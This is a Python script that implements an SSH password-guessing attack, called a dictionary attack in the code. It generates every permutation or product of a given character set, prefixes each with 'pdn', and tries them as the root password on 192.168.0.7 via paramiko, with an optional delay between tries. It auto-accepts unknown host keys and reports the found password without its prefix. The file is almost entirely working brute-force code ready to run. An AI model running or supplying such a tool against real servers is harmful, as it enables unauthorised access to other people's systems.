import itertools    # for calculating the possibilities
import paramiko     # for SSH connection
from time import sleep 

class DictionaryAttack:

    '''
    guess_mode has only 2 values : permutations and products default is permutaions.

    METHODS:
            - show_all_possible_passwords() to get all potentially available passwords.
            - start_attack() to perform attack on target with provided properties.
     '''
     
    def __init__(self, hostname: str, username: str, password_characters: str, password_length: int, guess_mode='permutation') -> str:
        self.hostname = hostname
        self.username = username
        self.password_characters = password_characters
        self.password_length = password_length
        self.guess_mode = guess_mode
        self.passwords = []
        if self.guess_mode == "permutation":
            if len(self.password_characters) == self.password_length:  
                # Calculating potential passwords with permutation
                permutations = itertools.permutations(self.password_characters)
                for p in permutations: 
                    self.passwords.append(''.join(p))
            else:
                PasswordLengthError = f"Can't calculate {self.password_length} digit passwords with the permutation of {len(self.password_characters)} characters ({self.password_characters})"
                raise ValueError(PasswordLengthError)
        elif self.guess_mode == "products":
            # Calculating potential passwords with products
            products = itertools.product(self.password_characters, repeat=self.password_length)
            for p in products: 
                self.passwords.append(''.join(p))
        else:
            InvalidGuessMode = f"Please provide a valid guess mode (permutations or products), {self.guess_mode} is not valid. "
            raise ValueError(InvalidGuessMode)
    
    def __str__(self) -> str:
        return f"""Ready to perfrom dictionary attack on {self.hostname}
provided username: {self.username}
provided password characters: {" ".join(self.password_characters)}
possible length of the password: {self.password_length}
guess mode: {self.guess_mode}                
        """
    def show_all_possible_passwords(self) -> tuple:

        '''
        get all potentially available passwords that will be used on attack.
        '''

        return self.passwords, f"Total: {len(self.passwords)}"

    def start_attack(self, interval=0) -> str:

        '''
        Initialize the attack on target with provided properties.
        it also gets an interval (default is 0) as seconds to delay between each authentication request.
        '''
    
        ssh = paramiko.SSHClient()  # Initializing an SSHClient
        # Automatically adding hostname and new host key to local
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
        print('\n') 
        for password in self.passwords:
            print(f"Trying pdn{password} as password ... ", end=" ")
            try:
                ssh.connect(hostname=self.hostname, username=self.username, password=f"pdn{password}")
                print("Succeeded!")
                status = True
                break
            except paramiko.ssh_exception.AuthenticationException:
                print("Failed")
                status = False
                sleep(interval)
                continue
            
        if status:
            return f"\nAttack was successful! ==> password: {password}"
        else:
            return f"\nAttack failed."


target = DictionaryAttack(hostname="192.168.0.7", username="root", password_characters="tfos", password_length=4)

print(target)
print("All possible passwords: ", target.show_all_possible_passwords())
print("\nAttack result: ", target.start_attack())